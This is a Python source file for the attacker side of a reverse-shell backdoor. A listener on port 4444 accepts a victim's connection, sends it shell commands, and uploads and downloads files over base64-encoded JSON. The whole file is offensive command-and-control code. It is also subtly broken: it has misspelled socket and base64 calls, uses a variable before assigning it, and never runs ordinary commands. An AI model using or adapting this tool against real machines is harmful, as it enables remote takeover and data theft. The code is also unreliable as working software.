import socket
import json
import base64

class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsocket(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listener.bind((ip,port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection,address = listener.accept()
        print("Got Connection From" + str(address))
    def box_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data)
    def box_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data+str(self.connection.recv(1024))
                return json.loads(json_data)
            except ValueError:
                continue
    def execute(self,command):
        self.box_send(command)
        if command[0]=="exit":
            self.connection.close()
            exit()
        return self.box_receive()
    def write_file(self,file_name,content):
        with open(file_name,"wb") as file:
            file.write(base64.b64ecode(content))
            return "[+] Download Successful"
    def read_file(self,file_name):
        with open(file_name,"rb") as file:
            return base64.b64encode(file.read())
    def run(self):
        while True:
            command = input(">>")
            command = command.split(" ")
            try:
                if command[0]=="upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                    responce = self.execute(command)
                if command[0]=="download":
                    responce = self.write_file(command[1],responce)
            except Exception:
                responce = "[+] Error while running the command"
                print(responce)
listener=Listener("our ip",4444)
listener.run()
